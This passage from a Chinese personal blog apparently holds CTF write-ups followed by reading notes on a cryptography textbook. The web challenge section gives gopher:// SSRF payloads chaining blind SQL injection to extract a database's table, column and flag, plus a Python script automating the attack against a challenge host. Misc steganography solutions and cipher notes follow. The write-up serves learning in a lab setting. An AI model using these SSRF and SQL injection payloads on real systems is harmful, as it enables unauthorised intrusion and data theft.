<p>同理可得,第二个字符是(u)，第三个是(a)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),2,1))=117)</code></p>
<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),3,1))=97)</code></p>
<p>即，数据库名为rua。</p>
<p><strong>查表名</strong><br>求当前数据库存在的表的数量<br>当前数据库存在2个表<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(table_name)/**/from/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database())/**/=/**/2</code></p>
<p>查表长度，为4<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(LENGTH((select/**/table_name/**/from/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1)/**/))/**/=/**/4</code></p>
<p>表名第一个字符ASCII值为102(f)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),1,1))=102</code></p>
<p>同理可得，第二个字符是(l)，第三个是(a)，第四个是(g)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),2,1))=108</code></p>
<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),3,1))=97</code></p>
<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),4,1))=103</code></p>
<p>即，表名是flag。</p>
<p><strong>求列名</strong><br>求表中列的数量(1个)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;)/**/=/**/1</code></p>
<p>求表中列的长度，4有输出5没有，所以长度是4<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;/**/limit/**/0,1),4,1))</code></p>
<p>第一个字母ASCII值为102(f)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;/**/limit/**/0,1),1,1))=102</code><br>同理，列名是flag</p>
<p><strong>求字段</strong><br>求字段数，只有一个。。。很好<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(flag)/**/from/**/flag)=1</code></p>
<p>求字段长度，24有输出25没有，所以长度是24<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/flag/**/from/**/flag/**/limit/**/0,1),24,1))</code></p>
<p>然后。。就一个一个的字符的。。试。。或者burp爆破。。再动上一点小脑筋。。。。<br>24个字符扣掉<code>ROIS&#123;&#125;</code>还有18个。。没有很多。。<br><img src="https://img.mjj.today/2023/02/11/b244fea670d1fd320360c67fd6e2fb96.png" alt="b244fea670d1fd320360c67fd6e2fb96.png"><br>最后解得flag的值</p>
<p>学长给了个python的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="comment">#导入urllib.parse模块，用于对url进行编码</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#导入requests模块，用于发送http请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuck</span>():</span><br><span class="line"><span class="comment">#定义一个函数，名称为fuck</span></span><br><span class="line">    url = <span class="string">&quot;http://101.43.57.52:43083/curl.php&quot;</span></span><br><span class="line">    <span class="comment">#定义一个url变量，用于存储要发送请求的url</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#定义一个result变量，用于存储最终查询到的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">    <span class="comment">#使用for循环，循环次数为1290次，循环变量i从1开始</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        <span class="comment">#定义一个head变量，用于存储字符的ASCII码的范围，初始值为32，对应空格</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="comment">#定义一个tail变量，用于存储字符的ASCII码的范围，初始值为127，对应~</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        <span class="comment">#使用while循环，当head小于tail时，循环继续</span></span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="comment">#定义一个mid变量，用于存储字符的ASCII码的中间值，等于head和tail的平均值</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查库名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查表名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查列名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查字段</span></span><br><span class="line">            <span class="built_in">id</span> = urllib.parse.quote(sqli)</span><br><span class="line">            <span class="comment">#使用urllib.parse.quote方法对sqli变量进行编码</span></span><br><span class="line">            id_length = <span class="built_in">len</span>(<span class="built_in">id</span>)+<span class="number">3</span></span><br><span class="line">            <span class="comment">#定义一个id_length变量，用于存储编码后的sqli语句的长度</span></span><br><span class="line">            payload = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /sqli.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;id_length&#125;</span></span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#定义一个payload变量，用于存储构造的http请求</span></span><br><span class="line"><span class="comment"># print(payload)：打印payload变量，用于查看构造的http请求</span></span><br><span class="line">            tmp = urllib.parse.quote(payload)</span><br><span class="line">            <span class="comment">#使用urllib.parse.quote方法对payload变量进行编码</span></span><br><span class="line">            new = tmp.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">            <span class="comment">#使用replace方法对编码后的payload变量进行替换，将%0A替换为%0D%0A</span></span><br><span class="line">            res = <span class="string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new</span><br><span class="line">            <span class="comment">#定义一个res变量，用于存储替换后的payload变量</span></span><br><span class="line">            dataa = &#123;</span><br><span class="line">                <span class="string">&quot;url&quot;</span>:res</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#定义一个dataa变量，用于存储要发送的数据</span></span><br><span class="line">            r = requests.post(url=url,data=dataa)</span><br><span class="line">            <span class="comment">#使用requests.post方法发送http请求，url参数为url变量，data参数为dataa变量</span></span><br><span class="line">            <span class="comment"># print(r.text)：打印r.text，用于查看返回的内容</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;meow meow meow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment">#如果返回内容中包含&quot;meow meow meow&quot;字符串，则执行if语句中的内容</span></span><br><span class="line">                head=mid+<span class="number">1</span></span><br><span class="line">                <span class="comment">#将head变量设置为mid+1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#如果返回内容中不包含&quot;meow meow meow&quot;字符串，则执行else语句中的内容</span></span><br><span class="line">                tail=mid</span><br><span class="line">                <span class="comment">#将tail变量设置为mid</span></span><br><span class="line">        <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        <span class="comment">#如果head变量不等于32，则执行if语句中的内容</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="comment">#将head变量对应的字符添加到result变量中</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#如果head变量等于32，则执行else语句中的内容</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#跳出for循环</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="comment">#打印result变量，用于查看最终查询到的结果</span></span><br><span class="line">fuck()</span><br><span class="line"><span class="comment">#执行fuck函数</span></span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="福到了"><a href="#福到了" class="headerlink" title="福到了"></a>福到了</h3><ol>
<li>png图片用winhex或010 Editor打开，可以在最末端IEND区后发现一个<code>DM</code>（但是因为不知道怎么用，很长一段时间没重视它（</li>
<li>Stegsolve可以看到R、G、B的0通道左上角和下面一排均有隐写痕迹，根据提取出来的<code>fudaole</code>的信息，可得，将图片翻转（这图不仅倒了还反了。。</li>
<li>翻转后再次用Stegsolve打开，r0&#x2F;g0&#x2F;b0均有504B开头数据，是zip文件头格式，保存为zip，打开压缩包，里面是一个叫binary的文件</li>
<li>学长给了hint是<code>DM</code>是个缩写，和一个关键词：“barcode”</li>
<li>可以联系到DM是DataMatrix的缩写</li>
<li>用winhex打开binary，观察十六进制数值可以发现开头是<code>AAAA..</code>结尾是<code>FFFF..</code></li>
<li>文件名联想二进制转换可得开头是<code>101010..</code>结尾是<code>111111..</code></li>
<li>研究DataMatrix形式可得其最上面一行和最右边一行是黑白格相间，最下面一行和最左边一行是全黑格，跟二进制数值有相符的地方，由此推测出用二进制绘制DataMatrix</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">binary_value=<span class="built_in">bin</span>(<span class="number">0xAAAAAAAAA92FA88BA664D1E08EDFA2479912C45CC2A3DD25ED44DA1E8EAFFA6BD154C732A32BCE0BC65491D4A8C9BB1B9110C150E223DD4DD46E8C5EFFFFFFFFAAAAAAAAAAA99283B152D446A2B3D145E74ED7E48885992B9D60A662AB77A05FFC649666CA53AD43B48EC59EBF119825EAF2A2EC82A7B4BBB256E5E6FFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line">binary_string=binary_value[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binary_string)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(binary_string))</span><br><span class="line"><span class="comment"># 1024=32x32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为二维数组</span></span><br><span class="line">binary_list = [binary_string[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将二进制转换为黑白图案</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary_list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary_list[i])):</span><br><span class="line">        <span class="keyword">if</span> binary_list[i][j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;██&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;  &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
<ol start="10">
<li>出来的DataMatrix码找个网站扫扫，即为flag</li>
</ol>
<h3 id="ez-gugugu"><a href="#ez-gugugu" class="headerlink" title="ez_gugugu"></a>ez_gugugu</h3><ol>
<li><p>将gugugu.jpg用winhex打开后发现尾部有<code>PK</code>和<code>flag.txt</code>字样</p>
</li>
<li><p>分离</p>
<p> 用binwalk打开<br> <code>python binwalk -e gugugu.jpg</code><br> 输出</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">102642        0x190F2         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>
<p> 分离zip文件<br> <code>python binwalk -D &quot;zip archive:zip&quot; gugugu.jpg</code><br> 我自己做时应该还能用，不知道为什么写wp时分离不成功了</p>
<p> 或者在winhex里搜索十六进制数值<code>FFD9</code>，复制其后面的十六进制，发现zip文件头损坏，补上<code>504B</code>，粘贴为zip文件保存</p>
</li>
<li><p>zip压缩包提示有密码</p>
</li>
</ol>
<p>根据encode.py写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">f1 = Image.<span class="built_in">open</span>(<span class="string">&quot;next.png&quot;</span>)</span><br><span class="line">f1 = f1.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">f2 = Image.<span class="built_in">open</span>(<span class="string">&quot;ff.png&quot;</span>)</span><br><span class="line">f2 = f2.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">new = Image.new(<span class="string">&quot;RGB&quot;</span>, f2.size)</span><br><span class="line">h = f2.height</span><br><span class="line">w = f2.width</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"><span class="built_in">print</span>(w)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        r1, g1, b1 = f1.getpixel((j, i))</span><br><span class="line">        r2, g2, b2 = f2.getpixel((j, i))</span><br><span class="line">        new.putpixel((w-j-<span class="number">1</span>, h-i-<span class="number">1</span>), (r1 ^ g2, g1 ^ b2, b1 ^ r2))</span><br><span class="line">new.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>在flag.png上得到压缩包密码，打开压缩包，得到flag</li>
</ol>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>《图解密码技术》读书笔记</title>
    <url>/2023/01/28/%E3%80%8A%E5%9B%BE%E8%A7%A3%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>不会吧不会吧不会真有人连读书笔记都往网上发吧</p>
<span id="more"></span>
<p>读《图解密码技术》ing。。<br>还挺有意思的这本书。。找了个图床贴点图片。。希望图片不会裂掉。。</p>
<p><img src="https://img.mjj.today/2023/01/28/33fad240cf463b69695e9ec84f106339.png" alt="33fad240cf463b69695e9ec84f106339.png"></p>
<p>记点可能有用的。。</p>
<h1 id="第一部分：密码"><a href="#第一部分：密码" class="headerlink" title="第一部分：密码"></a>第一部分：密码</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><blockquote>
<p>正当的接收者将密文还原为明文称为“解密”，但接收者以外的其他人试图将密文还原为明文，则称为密码破译( cryptanalysis )，简称为破译，有时也称为密码分析。</p>
</blockquote>
<h4 id="对称密码与公钥密码"><a href="#对称密码与公钥密码" class="headerlink" title="对称密码与公钥密码"></a>对称密码与公钥密码</h4><p><img src="https://img.mjj.today/2023/01/28/fddf2ceb003526dcf7df0b66f5676dec.png" alt="fddf2ceb003526dcf7df0b66f5676dec.png"></p>
<h4 id="隐写术与密码"><a href="#隐写术与密码" class="headerlink" title="隐写术与密码"></a>隐写术与密码</h4><blockquote>
<p>隐写术的目的是隐藏消息本身，但如果搞清楚了嵌人消息的方法，也就可以搞清楚消息的内容。因此，隐写术并不能代替密码。<br>密码隐藏的是内容，隐写术隐藏的是消息本身。通过将密码与隐写术相结合，就可以同时产生两者所各自具备的效果。</p>
</blockquote>
<h4 id="密码与信息安全常识"><a href="#密码与信息安全常识" class="headerlink" title="密码与信息安全常识"></a>密码与信息安全常识</h4><blockquote>
<p>●不要使用保密的密码算法</p>
<ol>
<li>密码算法的秘密早晚都会被公诸于世</li>
<li>开发高强度的密码算法是非常困难的</li>
</ol>
</blockquote>
<blockquote>
<p>●使用低强度的密码比不进行任何加密更危险<br>●任何密码总有一天都会被破解（但是量子密码不好说<br>●密码只是信息安全的一部分</p>
</blockquote>
<h4 id="小测验"><a href="#小测验" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>发送者Alice接收者Alice<br>小测验2<br>OXXOX</p>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="恺撒密码"><a href="#恺撒密码" class="headerlink" title="恺撒密码"></a>恺撒密码</h4><blockquote>
<p>密码算法:将明文中的各个字母按照指定的字母数平移<br>密钥:平移的字母数量</p>
</blockquote>
<h4 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h4><blockquote>
<p>密码算法:按照替换表对字母表进行替换<br>密钥:替换表</p>
</blockquote>
<h4 id="Enigma-通信密码的加密"><a href="#Enigma-通信密码的加密" class="headerlink" title="Enigma(通信密码的加密)"></a>Enigma(通信密码的加密)</h4><blockquote>
<p>密码算法:使用Enigma密码机，通过接线板的接线方式、3个转子的顺序、每个转子的旋转位置对字母进行替换<br>密钥(每日密码):接线板的接线方式、3个转子的顺序、每个转子的旋转位置</p>
</blockquote>
<h4 id="Enigma-通信电文的加密"><a href="#Enigma-通信电文的加密" class="headerlink" title="Enigma (通信电文的加密)"></a>Enigma (通信电文的加密)</h4><blockquote>
<p>密码算法:使用接线板的接线方式和3个转子的顺序固定的Enigma密码机，按照每个转子的旋转位置对字母进行替换<br>密钥(通信密码):每个转子的旋转位置</p>
</blockquote>
<h4 id="小测验-1"><a href="#小测验-1" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>CRYPTOGRAPHY<br>小测验2<br>错<br>小测验3<br><del>不道哇</del></p>
<h5 id="小测验3答案"><a href="#小测验3答案" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><p>小测验3的答案:没有L的密文<br>明文是一段只有字母L的文字，即LLLLL….发送者的目的是将毫无意义的明文加密发送以干扰密码破译者。<br>然而密码破译者知道Enigma的构造，即无论接线板如何接线，3个转子的顺序和每个转子的旋转位置如何改变，输入的字母都绝对不可能被替换成该字母本身。通过密文中没有L这一事实，密码破译者就能够推测出其明文可能是一串L。<br>此外，密码破译者还能够根据密文的排列组合继续进行破译，从而得到推测Enigma的接线板和转子状态的线索。<br>发送者本想干扰密码破译者，却反而为破译者提供了线索。顺便提一下，破解这一谜题的破译者名叫Mavis Lever，是一位女性。</p>
<h2 id="第三章：对称密码"><a href="#第三章：对称密码" class="headerlink" title="第三章：对称密码"></a>第三章：对称密码</h2><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>加密方式不算很明白，看了个大概<br>不过知道它可以被暴力破解</p>
<h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>增强DES的强度</p>
<h4 id="AES（Rijndael）"><a href="#AES（Rijndael）" class="headerlink" title="AES（Rijndael）"></a>AES（Rijndael）</h4><p>对称密码算法<br>逐字节替换&gt;向左平移&gt;矩阵运算&gt;XOR</p>
<p>大家现在都用AES。。</p>
<h4 id="小测验-2"><a href="#小测验-2" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>小于等于22的+3，大于等于23的-23<br>小测验2<br>错<br>小测验3<br><del>不道哇。。。我猜是E</del><br>小测验4<br><del>OXOXOO</del><br>OXXXOO</p>
<h5 id="小测验3答案-1"><a href="#小测验3答案-1" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><p><img src="https://img.mjj.today/2023/01/28/d2c62fbe2646bdcc5e72451d8447153a.png" alt="d2c62fbe2646bdcc5e72451d8447153a.png"></p>
<h5 id="小测验4第3问答案"><a href="#小测验4第3问答案" class="headerlink" title="小测验4第3问答案"></a>小测验4第3问答案</h5><p>如果密钥长度为56比特，那么用暴力破解找到正确密钥需要平均尝试约2^28次。（X）<br>平均尝试次数是密钥总数的大约一半。当密钥长度为56比特时，密钥总数为2^56个，它的一半是2^55（注意，不是指数56变成一半得28，而是减1得55）。<br>因此，当密钥长度为56比特时，平均尝试次数为2^55次，大约相当于3.6x10^16次。</p>
<h2 id="第四章：分组密码的模式"><a href="#第四章：分组密码的模式" class="headerlink" title="第四章：分组密码的模式"></a>第四章：分组密码的模式</h2><blockquote>
<p>密码算法可以分为<strong>分组密码</strong>和<strong>流密码</strong>两种。</p>
</blockquote>
<blockquote>
<p>分组密码处理完一个分组 就结束了，因此不需要通过内部状态来记录加密的进度;<br>相对地，流密码是对一串数据流进行连续处理，因此需要保持内部状态。</p>
</blockquote>
<blockquote>
<p>前面提到的算法中，只有一次性密码本属于流密码，而DES、三重DES、AES( Rijndael )等大多数对称密码算法都属于分组密码。</p>
</blockquote>
<h4 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h4><p>将明文分组直接加密</p>
<h5 id="ECB的风险"><a href="#ECB的风险" class="headerlink" title="ECB的风险"></a>ECB的风险</h5><blockquote>
<p>ECB模式中，每个明文分组都各自独立地进行加密和解密，但这其实是一个很大的弱点。<br>假如存在主动攻击者Mallory，他能够改变密文分组的顺序。当接收者对密文进行解密时，由于密文分组的顺序被改变了，因此相应的明文分组的顺序也会被改变。也就是说，攻击者Mallory无需破译密码就能够操纵明文。在这个场景中，攻击者Mallory不需要破译密码，也不需要知道分组密码算法，他只要知道哪个分组记录了什么样的数据(即电文的格式)就可以了。</p>
</blockquote>
<p>btw，我还以为Mallory是女名。。</p>
<h4 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h4><blockquote>
<p>首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密</p>
</blockquote>
<p><img src="https://img.mjj.today/2023/01/28/383d9d5b787251945de63be98b21e732.png" alt="383d9d5b787251945de63be98b21e732.png"></p>
<blockquote>
<p>ECB模式和CBC模式的区别：ECB模式只进行了加密，而CBC模式则在加密之前进行了一次XOR。</p>
</blockquote>
<h4 id="CTS"><a href="#CTS" class="headerlink" title="CTS"></a>CTS</h4><p>ECB和CTF混合使用</p>
<h4 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h4><p><img src="https://img.mjj.today/2023/01/28/91a945dd607f42d856e1ffba256b6f09.png" alt="91a945dd607f42d856e1ffba256b6f09.png"></p>
<blockquote>
<p>在CFB模式中，明文数据可以被逐比特加密，因此我们可以将CFB模式看作是一种使用分组密码来实现流密码的方式。</p>
</blockquote>
<h4 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h4><p><img src="https://img.mjj.today/2023/01/28/14ebda9ae34cb830ad7c485a89721396.png" alt="14ebda9ae34cb830ad7c485a89721396.png"></p>
<h4 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h4><blockquote>
<p>CTR模式的全称是CounTeR模式(计数器模式)。CTR模式是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。</p>
</blockquote>
<p><img src="https://img.mjj.today/2023/01/28/a55b5490b690e67ce60f1b1e85a73eda.png" alt="a55b5490b690e67ce60f1b1e85a73eda.png"></p>
<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p><img src="https://img.mjj.today/2023/01/28/f36d4213ed567f992f675b7da0f18a48.png" alt="f36d4213ed567f992f675b7da0f18a48.png"></p>
<h4 id="小测验-3"><a href="#小测验-3" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>16<br>小测验2<br><del>把用户名称和口令错开。。</del><br>小测验3<br><del>能猜出初始化变量。。？</del><br>小测验4<br><del>不道哇。。</del><br>小测验5<br>等于通过XOR加密。。。。？<br>小测验6<br><del>XOXX</del></p>
<h5 id="小测验2答案"><a href="#小测验2答案" class="headerlink" title="小测验2答案"></a>小测验2答案</h5><p>很多种方式，可以把口令用用户名称覆盖，这样子知道用户名就可以登陆了</p>
<h5 id="小测验3答案-2"><a href="#小测验3答案-2" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><blockquote>
<p>在CBC模式中，我们假设永远使用相同的初始化向量。于是，当用同一密钥对同一明文进行加密时，所得到的密文一定是相同的。<br>例如，密码破译者间隔一周收到了两份相同的密文。于是，密码破译者无需破译密码，就可以判断出:这份密文和上周的密文一样，因此两份密文解密所得到的明文也是一样的。<br>如果在每次加密时都改变初始化向量的值，那么即便是用同一密钥对同一明文进行加密，也可以确保每次所得到的密文都不相同。</p>
</blockquote>
<h5 id="小测验4答案"><a href="#小测验4答案" class="headerlink" title="小测验4答案"></a>小测验4答案</h5><blockquote>
<p>Alice的这个模式，实质上等同于ECB模式。</p>
</blockquote>
